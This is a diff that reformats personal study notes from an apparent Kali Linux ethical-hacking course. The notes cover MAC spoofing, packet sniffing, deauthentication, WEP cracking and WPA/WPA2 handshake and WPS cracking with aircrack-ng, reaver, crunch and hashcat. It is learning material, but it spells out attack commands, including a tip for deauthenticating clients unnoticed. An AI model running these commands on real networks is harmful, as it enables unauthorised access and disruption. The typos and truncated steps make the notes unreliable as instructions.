@@ -1,11 +1,11 @@
 
-INSTALLATION
+**INSTALLATION**
 install link for kalilinux - https://zsecurity.org/download-custom-kali/
 unzip it
 Go to vm ware, file -open -this unzipped file
 check settings
 run
-LINUX BASIC COMMANDS:
+**LINUX BASIC COMMANDS:**
 pwd
 ls    ls -l
 cd   cd ..
@@ -14,17 +14,16 @@ tab -> auto complete
 apt-get    -> donwload or install progs (or) apps
 apt-get update
 apt-get install app_name -y
-NEEDED APPS:    (apt-get install terminator)
+**NEEDED APPS:**    (apt-get install terminator)
 terminator  - spliting option in terminal
-WEBSITES:
+**WEBSITES:**
 explainshell.com
 
 
+## PRE CONNECTION SETUP KNOWLEDGE
+<span style="color:blue">some *blue* text</span>.
 
-
-PRE CONNECTION SETUP KNOWLEDGE:
-
-wireless adapter with props
+#### wireless adapter with props:- ####
 monitor mode
 packet injection
 AP mode
@@ -41,13 +40,13 @@ contains source mac and destination mac
 change MAC address to become anonymous    
 Uses: Bypass filter, anonymity
 
-Network Interfaces
-network interface – any device allowing us to connect to a network
-inside eth0 or wlan0 or lo    ether _______________>mac address of the network interface if not connected to any network ether is not shown and unspec (first 12 digits without :) in monitor mode
+**Network Interfaces**
+<p>network interface – any device allowing us to connect to a network
+inside eth0 or wlan0 or lo ether _______________>mac address of the network interface if not connected to any network ether is not shown and unspec (first 12 digits without :) in monitor mode
 ifconfig -> show all interfaces
-iwconfig → show all wireless network interfaces
+iwconfig → show all wireless network interfaces</p>
 
-Change MAC address
+#### Change MAC address
 ifconfig wlan0 down    →  for disabling before the change process
 ifconfig wlan0 hw ether 00:11:22:33:44:55                (after restart get resetted)
 ifconfig wlan0 up
@@ -63,9 +62,9 @@ can do monitor using monitor mode    (captures packets from any destination addr
 attacks don't need any internet connection
 
 
-PACKET SNIFFING
-aircrack-ng
-airodump-ng mon0      → shows the packets
+### PACKET SNIFFING
+**aircrack-ng**
+> airodump-ng mon0      → shows the packets
 most of the wifi adapter only communicates with 2.5ghz frequency
 
 ESSID      name
@@ -81,53 +80,54 @@ airodump-ng  - - bssid  11:21:G6:14   - -channel  2  - - write  filename   mon0
 ctr C     ( to stop)
 
 
-Deauthentication
+### Deauthentication 
 To pretend as client having its mac address
 To pretend like router having its mac address and disconnecting all networks
-airplay-ng
-airplay-ng  - -deauth  100000000 -a target_router_mac_address  -c client_mac_address  mo0   (mac_address info is taken from airodump-ng)
-ctr  C    to stop
+**airplay-ng**
+>airplay-ng  - -deauth  100000000 -a target_router_mac_address  -c client_mac_address  mo0   (mac_address info is taken from airodump-ng)
+>ctr  C    to stop
 
-GAINING ACCESS:
+## GAINING ACCESS: 
 
-WEP CRACKING
+### WEP CRACKING
 The client encrypts the data with a unique key and sends in air to the router
 This router decrypts the data using same key.
 Initial vector + passsword =  keystream
 keystream + “this is the message”  →  cnu3dhubd   (encoded)
 router always have the key but not Initial vector(IV)
 IV is only 24bits so it repeats it again and again without creating unique key
+
 Methods
 airodump-ng   to capture all packets/IVs
 aircrack-ng      to analyze the IVs and crack the key
-airodump-ng  - - bssid  target_mac  - -channel  2  - - write  filename   mon0 
+> airodump-ng  - - bssid  target_mac  - -channel  2  - - write  filename   mon0 
 filename.cap is the file
-aircrack-ng filename.cap 
+> aircrack-ng filename.cap 
 prompts key found!  23:42:23:A2
 put the password in wifi as 234223A2  done
 
-Fakeauth attack
+##### Fakeauth attack
 -a for accknowledge must do before all attacks
-aireplay-ng - -fakeauth 0 -a target_mac -h my_mac
+>aireplay-ng - -fakeauth 0 -a target_mac -h my_mac
 
-Arp request reply attack
+#### Arp request reply attack
 if the router or wifi is not having more data passed, it can't be cracked,so need to inject more packages with aireplay
-aireplay-ng - -fakeauth 0 -a target_mac -h my_mac   (ACK for telling we are connecting to the netw interface )
-airodump-ng  - - bssid  target_mac  - -channel  2  - - write  file_name  mon0
-aireplay-ng  - -arpreplay -b target_mac -h my_mac mon0        check data value in info
-aircrack-ng filename.cap
+>aireplay-ng - -fakeauth 0 -a target_mac -h my_mac   (ACK for telling we are connecting to the netw interface )
+>airodump-ng  - - bssid  target_mac  - -channel  2  - - write  file_name  mon0
+>aireplay-ng  - -arpreplay -b target_mac -h my_mac mon0        check data value in info
+>aircrack-ng filename.cap
 or 
 
-Korek ChopChop Attack   (refer somewhere)
-aireplay-ng - -fakeauth 0 -a target_mac -h my_mac  
-airodump-ng  - - bssid  target_mac  - -channel  2  - - write  file_name  mon0
-aireplay-ng - -chopchop -a target_mac -h my_mac
-packetforge-ng -0...............
+#### Korek ChopChop Attack   (refer somewhere)
+>aireplay-ng - -fakeauth 0 -a target_mac -h my_mac  
+>airodump-ng  - - bssid  target_mac  - -channel  2  - - write  file_name  mon0
+>aireplay-ng - -chopchop -a target_mac -h my_mac
+>packetforge-ng -0...............
 …..........
 or
-Fragmentation Attack (refer somewhere)
+#### Fragmentation Attack (refer somewhere)
 
-WPA AND WPA2 CRACKING
+### WPA AND WPA2 CRACKING
 
 wpa and wpa2 have the wps push button enabled or disable which is useful in cracking.
 This wps feature can be found by
@@ -135,38 +135,38 @@ wash  - - interface mon0
 Lck   tells locked or not
 it may fail if the target router has PBC(push button auth) or wps disabled
 
-reaver - -bssid  target_mac - -channel 1 - -interface mon0 -vvv - -no-associate
+>reaver - -bssid  target_mac - -channel 1 - -interface mon0 -vvv - -no-associate
 paralleley add the down cmd
-aireplay-ng - -fakeauth 0 -a target_mac -h my_mac
+>aireplay-ng - -fakeauth 0 -a target_mac -h my_mac
 
 when PBC(push button auth) or wps disabled, use the following method 
-airplay-ng  - -deauth  4 -a target_router_mac_address  -c client_mac_address  mon0   (use –deauth 4 so that client don't identify they are disconnected)
+>airplay-ng  - -deauth  4 -a target_router_mac_address  -c client_mac_address  mon0   (use –deauth 4 so that client don't identify they are disconnected)
 
-Create word list:
+**Create word list:**
 crunch
-crunch 6 8 abctd123$@ -o pass.txt
+>crunch 6 8 abctd123$@ -o pass.txt
 6 min combinations
 8 max combinations
 abctd123$@ combinations to use 
 
-aircrack-ng handshake.cap  -w pass.txt
+>aircrack-ng handshake.cap  -w pass.txt
 done :)
 
-Pairwise Master Key from word list (faster than previous)
-airolib-ng test-db  - -import password pass.txt
+**Pairwise Master Key** from word list (faster than previous)
+>airolib-ng test-db  - -import password pass.txt
 create a text file with essid 
-airolib-ng test-db  - -import essid essid.txt
-airolib-ng test-db –batch
+>airolib-ng test-db  - -import essid essid.txt
+>airolib-ng test-db –batch
 done :)
 
-aircrack-ng -r test-db handshake.cap  
+>aircrack-ng -r test-db handshake.cap  
 done :)
 
-Hashcat (use GPU - fastest cracking ) in windows      
+**Hashcat** (use GPU - fastest cracking ) in windows      
 download converted file of .cap to .hccapx and add it in hashcat dir
 add pass.txt in hashcat dir
-hashcat64.exe -I          shows cpu and gpu info
-hashcat64.exe -m 2500 -d 1 handshake.hcapx pass.txt
+>hashcat64.exe -I          shows cpu and gpu info
+>hashcat64.exe -m 2500 -d 1 handshake.hcapx pass.txt
 m - wpa/wpa2 hash 
 d -  which device to use
 
